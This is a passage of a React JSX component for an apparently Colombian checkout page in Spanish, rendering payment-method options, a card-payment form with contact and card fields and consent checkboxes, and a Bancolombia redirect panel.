        <div style={{ flex: '1' }}></div>

        {/* Footer - Calcular en mi moneda */}
        <div style={{
          textAlign: 'center',
          width: '100%'
        }}>
          <p style={{
            margin: '0px',
            fontWeight: 400,
            fontSize: '14px',
            lineHeight: '20px',
            color: 'rgba(255, 255, 255, 0.7)'
          }}>
            Calcular en <button onClick={() => setShowCurrencyModal(true)} style={{
              background: 'none',
              border: 'none',
              color: 'rgb(255, 255, 255)',
              textDecoration: 'underline',
              cursor: 'pointer',
              fontWeight: 400,
              fontSize: '14px',
              padding: 0
            }}>mi moneda</button>
          </p>
        </div>
      </div>

      {/* Columna derecha - Responsive: abajo en móvil, derecha en desktop */}
      <div className="w-full bg-white p-6 lg:p-12 overflow-y-auto min-h-screen" style={{ width: '60%' }}>
        <div className="max-w-2xl mx-auto">
          {/* Título y botón cambiar método */}
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-2xl font-black text-[#1f126f]">
              ¿Cómo quieres pagar?
            </h2>
            {paymentOption && (
              <button
                onClick={() => setPaymentOption(null)}
                className="text-[#f02c4c] hover:text-[#d02440] font-semibold text-sm transition"
              >
                Cambiar método de pago
              </button>
            )}
          </div>

          {/* Opciones de pago - Solo se muestran si NO hay método seleccionado */}
          {!paymentOption && (
            <>
              <p className="text-sm font-semibold text-gray-700 mb-3">Pago con tarjeta</p>
              <div className="space-y-3 mb-6">

                {/* Pago con tarjeta con carousel */}
                <button
                  type="button"
                  onClick={() => setPaymentOption('card')}
                  className="w-full transition group"
                  style={{
                    backgroundColor: 'rgb(247, 248, 251)',
                    borderRadius: '16px',
                    border: 'none',
                    padding: '16px 20px 16px 12px',
                    minHeight: '72px',
                    cursor: 'pointer'
                  }}
                >
                  <div className="flex items-center justify-between w-full">
                    <div className="flex items-center gap-4">
                      <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center group-hover:border-gray-400">
                      </div>
                      <div className="flex items-center gap-3">
                        <img src="/logos/bold/credit-card.svg" alt="" className="w-7 h-7" />
                        <span className="font-bold text-[#1f126f] text-base">Pago con tarjeta</span>
                      </div>
                    </div>
                    {/* Carousel de tarjetas al lado derecho */}
                    <div className="flex-shrink-0">
                      <CardCarousel />
                    </div>
                  </div>
                </button>

                {/* Separador */}
                <p className="text-sm font-semibold text-gray-700 mb-3 mt-6">Transferencia bancaria</p>

                {/* Opción 2: Botón Bancolombia - DESHABILITADO */}
                <button
                  type="button"
                  disabled
                  className="w-full flex items-center justify-between transition opacity-50 cursor-not-allowed"
                  style={{
                    backgroundColor: 'rgb(247, 248, 251)',
                    borderRadius: '16px',
                    border: 'none',
                    padding: '16px 20px 16px 12px',
                    minHeight: '72px'
                  }}
                >
                  <div className="flex items-center gap-4">
                    <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center">
                    </div>
                    <div className="flex items-center gap-3">
                      <img src="/logos/bancos/BANCOLOMBIA.png" alt="Bancolombia" className="h-6 object-contain grayscale" />
                      <span className="font-bold text-gray-500 text-base">Botón Bancolombia</span>
                    </div>
                  </div>
                  <span className="text-xs text-gray-400 italic">Próximamente</span>
                </button>

                {/* Opción 3: Nequi - DESHABILITADO */}
                <button
                  type="button"
                  disabled
                  className="w-full flex items-center justify-between transition opacity-50 cursor-not-allowed"
                  style={{
                    backgroundColor: 'rgb(247, 248, 251)',
                    borderRadius: '16px',
                    border: 'none',
                    padding: '16px 20px 16px 12px',
                    minHeight: '72px'
                  }}
                >
                  <div className="flex items-center gap-4">
                    <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center">
                    </div>
                    <div className="flex items-center gap-3">
                      <span className="text-3xl font-bold text-gray-400">N</span>
                      <span className="font-bold text-gray-500 text-base">Nequi</span>
                    </div>
                  </div>
                  <span className="text-xs text-gray-400 italic">Próximamente</span>
                </button>

                {/* Opción 4: PSE - DESHABILITADO */}
                <button
                  type="button"
                  disabled
                  className="w-full flex items-center justify-between transition opacity-50 cursor-not-allowed"
                  style={{
                    backgroundColor: 'rgb(247, 248, 251)',
                    borderRadius: '16px',
                    border: 'none',
                    padding: '16px 20px 16px 12px',
                    minHeight: '72px'
                  }}
                >
                  <div className="flex items-center gap-4">
                    <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center">
                    </div>
                    <div className="flex items-center gap-3">
                      <img src="/logos/bancos/PSE.png" alt="PSE" className="h-6 object-contain grayscale" />
                      <span className="font-bold text-gray-500 text-base">PSE</span>
                    </div>
                  </div>
                  <span className="text-xs text-gray-400 italic">Próximamente</span>
                </button>
              </div>

              {/* Badges de seguridad cuando no hay método seleccionado */}
              <div className="mt-8">
                <SecurityBadges />
              </div>
            </>
          )}

          {/* FORMULARIO DE TARJETA - Solo aparece si se selecciona */}
          {paymentOption === 'card' && (
            <form onSubmit={handleSubmit} className="space-y-5 animate-in slide-in-from-top duration-300">
              {/* Método seleccionado - Card compacto */}
              <div
                className="w-full"
                style={{
                  backgroundColor: 'rgb(247, 248, 251)',
                  borderRadius: '16px',
                  border: '2px solid #f02c4c',
                  padding: '16px 20px 16px 12px',
                  minHeight: '72px'
                }}
              >
                <div className="flex items-center justify-between w-full">
                  <div className="flex items-center gap-4">
                    <div className="w-6 h-6 rounded-full bg-[#f02c4c] flex items-center justify-center">
                      <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="flex items-center gap-3">
                      <img src="/logos/bold/credit-card.svg" alt="" className="w-7 h-7" />
                      <span className="font-bold text-[#1f126f] text-base">Pago con tarjeta</span>
                    </div>
                  </div>
                  {/* Carousel de tarjetas al lado derecho */}
                  <div className="flex-shrink-0">
                    <CardCarousel />
                  </div>
                </div>
              </div>

              {/* Teléfono */}
              <div>
                <label className="block text-sm font-bold text-[#1f126f] mb-2">
                  Teléfono
                </label>
                <div className="flex gap-2">
                  <div className="flex items-center gap-2 px-3 bg-gray-50 border border-gray-300 rounded-lg">
                    <span className="text-2xl">🇨🇴</span>
                    <span className="text-gray-700 font-medium">+57</span>
                    <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>
                  <input
                    type="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                    placeholder="3123122244"
                    required
                    className="flex-1 px-4 py-3 bg-gray-50 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#f02c4c] focus:border-transparent text-gray-900 placeholder:text-gray-400"
                  />
                </div>
              </div>

              {/* Email */}
              <div>
                <label className="block text-sm font-bold text-[#1f126f] mb-2">
                  Ingresa tu correo electrónico
                </label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="admdsasdin@gmail.com"
                  required
                  className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#f02c4c] focus:border-transparent text-gray-900 placeholder:text-gray-400"
                />
              </div>

              {/* Información del cliente desde checkout */}
              {orderData.customer && (
                <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                  <h4 className="text-sm font-semibold text-gray-700 mb-3">Información del cliente</h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    {/* Nombre completo */}
                    {orderData.customer.fullName && (
                      <div>
                        <label className="block text-xs font-medium text-gray-600">
                          Nombre completo
                        </label>
                        <input
                          type="text"
                          value={orderData.customer.fullName}
                          readOnly
                          className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                        />
                      </div>
                    )}

                    {/* Documento de identidad */}
                    {orderData.customer.documentId && (
                      <div>
                        <label className="block text-xs font-medium text-gray-600">
                          Cédula
                        </label>
                        <input
                          type="text"
                          value={orderData.customer.documentId}
                          readOnly
                          className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                        />
                      </div>
                    )}

                    {/* Dirección */}
                    {orderData.customer.address && (
                      <div className="md:col-span-2">
                        <label className="block text-xs font-medium text-gray-600">
                          Dirección
                        </label>
                        <input
                          type="text"
                          value={orderData.customer.address}
                          readOnly
                          className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                        />
                      </div>
                    )}

                    {/* Ciudad y código postal si están disponibles */}
                    <div className="md:col-span-2 grid grid-cols-1 md:grid-cols-3 gap-2">
                      {orderData.customer.city && (
                        <div>
                          <label className="block text-xs font-medium text-gray-600">
                            Ciudad
                          </label>
                          <input
                            type="text"
                            value={orderData.customer.city}
                            readOnly
                            className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                          />
                        </div>
                      )}
                      {orderData.customer.state && (
                        <div>
                          <label className="block text-xs font-medium text-gray-600">
                            Departamento
                          </label>
                          <input
                            type="text"
                            value={orderData.customer.state}
                            readOnly
                            className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                          />
                        </div>
                      )}
                      {orderData.customer.postalCode && (
                        <div>
                          <label className="block text-xs font-medium text-gray-600">
                            Código postal
                          </label>
                          <input
                            type="text"
                            value={orderData.customer.postalCode}
                            readOnly
                            className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                          />
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Número de tarjeta */}
              <div>
                <label className="block text-sm font-bold text-[#1f126f] mb-2">
                  Número de tarjeta
                </label>
                <div className="relative">
                  <input
                    type="text"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    placeholder="---- ---- ---- ----"
                    required
                    maxLength={19}
                    className="w-full px-4 py-3 pr-12 bg-gray-50 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#f02c4c] focus:border-transparent text-gray-900 placeholder:text-gray-400"
                  />
                  <svg className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z" />
                  </svg>
                </div>
              </div>



              {/* Fecha de expiración y CVV */}
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-bold text-[#1f126f] mb-2">
                    Vencimiento
                  </label>
                  <input
                    type="text"
                    value={expiryDate}
                    onChange={handleExpiryChange}
                    placeholder="MM/AA"
                    required
                    maxLength={5}
                    className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#f02c4c] focus:border-transparent text-gray-900 placeholder:text-gray-400"
                  />
                </div>
                <div>
                  <label className="flex items-center gap-2 text-sm font-bold text-[#1f126f] mb-2">
                    CVV o CVC
                    <button
                      type="button"
                      className="w-4 h-4 rounded-full border-2 border-gray-400 flex items-center justify-center hover:border-gray-600 transition"
                      title="El CVV son los 3 o 4 últimos dígitos en el reverso de tu tarjeta"
                    >
                      <span className="text-[10px] text-gray-500 font-bold">?</span>
                    </button>
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                      placeholder="---"
                      required
                      maxLength={cardType === 'American Express' ? 4 : 3}
                      className="w-full px-4 py-3 pr-12 bg-gray-50 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#f02c4c] focus:border-transparent text-gray-900 placeholder:text-gray-400"
                    />
                    <svg className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z" />
                    </svg>
                  </div>
                </div>
              </div>

              {/* Nombre del titular */}
              <div>
                <label className="block text-sm font-bold text-[#1f126f] mb-2">
                  Nombre del titular
                </label>
                <input
                  type="text"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  placeholder="juan VALLE"
                  required
                  className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#f02c4c] focus:border-transparent text-gray-900 placeholder:text-gray-400"
                />
              </div>

              {/* Checkboxes */}
              <div className="space-y-3 mt-6">
                <label className="flex items-start gap-3 cursor-pointer group">
                  <input
                    type="checkbox"
                    checked={acceptData}
                    onChange={(e) => setAcceptData(e.target.checked)}
                    className="mt-0.5 w-5 h-5 rounded border-2 border-gray-400 text-[#f02c4c] focus:ring-[#f02c4c]"
                  />
                  <span className="text-sm text-gray-700">
                    Acepto el tratamiento de mis datos personales de acuerdo con la{' '}
                    <a href="/politica-privacidad" className="text-[#1f126f] underline hover:text-[#f02c4c]">
                      Política de privacidad
                    </a>
                  </span>
                </label>
                <label className="flex items-start gap-3 cursor-pointer group">
                  <input
                    type="checkbox"
                    checked={acceptTerms}
                    onChange={(e) => setAcceptTerms(e.target.checked)}
                    className="mt-0.5 w-5 h-5 rounded border-2 border-gray-400 text-[#f02c4c] focus:ring-[#f02c4c]"
                  />
                  <span className="text-sm text-gray-700">
                    Acepto{' '}
                    <a href="/terminos-condiciones" className="text-[#1f126f] underline hover:text-[#f02c4c]">
                      Términos y condiciones
                    </a>
                  </span>
                </label>
              </div>

              {/* Botón de pago */}
              <button
                type="submit"
                disabled={loading || !acceptData || !acceptTerms}
                className="w-full bg-[#f02c4c] hover:bg-[#d02440] text-white font-bold py-4 rounded-full text-lg transition disabled:opacity-50 disabled:cursor-not-allowed shadow-lg flex items-center justify-center gap-2 mt-6"
              >
                {loading ? (
                  <>
                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Procesando...
                  </>
                ) : 'Pagar'}
              </button>

              {/* Link abandonar */}
              <button
                type="button"
                onClick={() => router.push('/checkout')}
                className="w-full text-center text-[#1f126f] hover:underline text-sm font-semibold mt-4"
              >
                Abandonar pago
              </button>

              {/* Footer seguridad con componente SecurityBadges */}
              <SecurityBadges />
            </form>
          )}

          {/* FORMULARIO/MENSAJE DE BANCOLOMBIA - Solo aparece si se selecciona */}
          {paymentOption === 'bancolombia' && (
            <div className="bg-yellow-50 border-2 border-yellow-400 rounded-2xl p-10 text-center animate-in slide-in-from-top duration-300">
              <div className="flex justify-center mb-6">
                <img src="/logos/bancos/BANCOLOMBIA.png" alt="Bancolombia" className="h-16 object-contain" />
              </div>
              <p className="text-2xl font-bold text-gray-900 mb-3">
                Botón Bancolombia
              </p>
              <p className="text-gray-700 mb-6 text-lg">
                Serás redirigido a la app de Bancolombia para completar el pago de manera segura.
              </p>
              <button
                type="button"
                onClick={() => alert('Redirigiendo a Bancolombia...')}
                className="bg-yellow-400 hover:bg-yellow-500 text-gray-900 font-bold py-4 px-8 rounded-full text-lg transition shadow-lg"
              >
                Continuar con Bancolombia
              </button>
              <button
                type="button"
                onClick={() => router.push('/checkout')}
                className="block w-full text-center text-blue-600 hover:underline text-sm font-medium mt-6"
              >
                Cancelar y volver
              </button>
            </div>
          )}
        </div>
      </div>

    </div >
  );
}
